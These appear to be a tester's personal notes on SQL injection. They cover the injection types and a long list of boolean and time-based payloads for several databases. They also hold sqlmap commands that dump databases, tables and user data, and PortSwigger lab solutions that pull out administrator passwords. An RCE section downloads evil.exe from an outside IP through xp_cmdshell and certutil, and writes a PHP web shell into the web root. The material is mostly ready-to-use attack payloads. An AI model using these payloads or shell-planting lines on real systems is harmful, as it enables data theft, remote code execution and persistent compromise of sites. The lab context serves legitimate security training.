SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve.

- **classic SQL Injection**:
    - Exploits input fields that directly modify SQL queries.
    - Example: `SELECT * FROM users WHERE username = 'user_input' AND password = 'user_input';` Malicious input: `' OR '1'='1` transforms the query into: `SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1';`
    
- **Blind SQL Injection**:
    - Occurs when the application does not display query results but provides feedback via success/failure responses.
    - Techniques:
        - **Boolean-Based**: Inject payloads that produce different responses based on conditions (e.g., `' AND 1=1--` vs. `' AND 1=2--`).
        - **Time-Based**: Use functions like `SLEEP()` to infer conditions based on response time.
- **Error-Based SQL Injection**:
    - Leverages error messages to extract information about the database structure.
- **Union-Based SQL Injection**:
    - Combines results from different SELECT statements to extract data.
    - Example: `' UNION SELECT null, username, password FROM users--`


**Entry Point Detection**:
```sql
'
"
`
')
")
`)
'))
"))
`))
```

Then, you need to know how to **fix the query so there isn't errors**. In order to fix the query you can **input** data so the **previous query accept the new data**, or you can just **input** your data and **add a comment symbol add the end**.

```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/
```


 **SQLI Logic**:
```
true
1
1>0
2-1
0+1
1*1
1%2
1 & 1
1&1
1 && 2
1&&2
-1 || 1
-1||1
-1 oR 1=1
1 aND 1=1
(1)oR(1=1)
(1)aND(1=1)
-1/**/oR/**/1=1
1/**/aND/**/1=1
1'
1'>'0
2'-'1
0'+'1
1'*'1
1'%'2
1'&'1'='1
1'&&'2'='1
-1'||'1'='1
-1'oR'1'='1
1'aND'1'='1
1"
1">"0
2"-"1
0"+"1
1"*"1
1"%"2
1"&"1"="1
1"&&"2"="1
-1"||"1"="1
-1"oR"1"="1
1"aND"1"="1
1`
1`>`0
2`-`1
0`+`1
1`*`1
1`%`2
1`&`1`=`1
1`&&`2`=`1
-1`||`1`=`1
-1`oR`1`=`1
1`aND`1`=`1
1')>('0
2')-('1
0')+('1
1')*('1
1')%('2
1')&'1'=('1
1')&&'1'=('1
-1')||'1'=('1
-1')oR'1'=('1
1')aND'1'=('1
1")>("0
2")-("1
0")+("1
1")*("1
1")%("2
1")&"1"=("1
1")&&"1"=("1
-1")||"1"=("1
-1")oR"1"=("1
1")aND"1"=("1
1`)>(`0
2`)-(`1
0`)+(`1
1`)*(`1
1`)%(`2
1`)&`1`=(`1
1`)&&`1`=(`1
-1`)||`1`=(`1
-1`)oR`1`=(`1
1`)aND`1`=(`1
```

**Timing**:
```sh
#MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)
SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')

#PostgreSQL (only support string concat)
1' || pg_sleep(10)
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END

#MySQL
SELECT SLEEP(10)
SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a') 

#Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual

#SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))

#Microsoft

WAITFOR DELAY '0:0:10'
IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
```

**Union Based**

Use UNION to retrieve data: `' UNION SELECT null, username, password FROM users--`

**Blind Based:**
- Boolean-Based: `' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0--`
- Time-Based: `' AND IF(1=1, SLEEP(5), 0)--`
### SQLMAP

```
 sqlmap -r ./Downloads/sql --force-ssl --dbms=oracle --proxy="http://127.0.0.1:8080" --tamper=space2comment

```

`--dbs ` dumps **available db**
`--technique`  for choosing specific **technique** like `time based ` or `ERROR-Based`

```bash
 sqlmap -r practice --level 5 --risk 3 --proxy http://127.0.0.1:8080 --dbms postgresql --technique E --dbs
```


after checking the available db  dump the **tables**
```bash
 sqlmap -r practice --level 5 --risk 3 --proxy http://127.0.0.1:8080 --dbms postgresql --technique E -D public --tables
```

after choosing a tables dump the **data**

```bash
 sqlmap -r practice --level 5 --risk 3 --proxy http://127.0.0.1:8080 --dbms postgresql --technique E -D public -T users --dump
```



****

### Lab

#### Blind SQL injection with time delays and information retrieval

``` SQL

;SELECT CASE WHEN (username = 'administrator' and SUBSTR(password,1,1)='1') THEN pg_sleep(10) ELSE pg_sleep(0) END  from users  --

```



#### Blind SQL injection with conditional responses


```sql
TrackingId=5hIAPABv6QExrguw' AND 'a'%3d'a
```


i noticed that the return byte value is different when the condition is true or false hence i checked with the comparer and noticed that the sentence Welcome back is present when its true and not in false

```sql
TrackingId=5hIAPABv6QExrguw' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), §1§, 1) = '§s§;

```


#### SQL injection attack, listing the database contents on non-Oracle databases

[[OAuth 2.0]]
so then i tried with UNION query
```sql
'+UNION select NULL , NULL from Information_Schema
```

that worked so i started navigating  i checked both params are strings by adding `a` 

i listed the table_name  from information_schema

```sql
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

i noticed an instersting table name `users_bfyput` 

then i checked  its columns 
```sql
'UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_bfyput'

```


final exploit
```sql
GET /filter?category=Corporate+gifts' UNION  SELECT username_aijksa , password_ghkluz from users_bfyput -- 
```


#### SQL injection with filter bypass via XML encoding


there is `WAF` so we need to obfuscate so i used hackvector to encode they payload in  hex


```
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId></stockCheck>
```




#### SQL injection attack, querying the database type and version on Oracle

```sql
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

#### RCE

```sql
';EXEC xp_cmdshell "certutil.exe -urlcache -split -f http://192.168.45.194/evil.exe c:\windows\temp\evil.exe";--
```


```sql
union all select 1,2,3,"<?php echo shell_exec($_GET['cmd']); ?>" ,5 into OUTFILE '/var/www/html/shell.php'
```
### References

- https://portswigger.net/web-security/sql-injection/cheat-sheet
- https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html?highlight=sql%20inject#identifying-with-portswigger
- https://portswigger.net/web-security/all-labs#sql-injection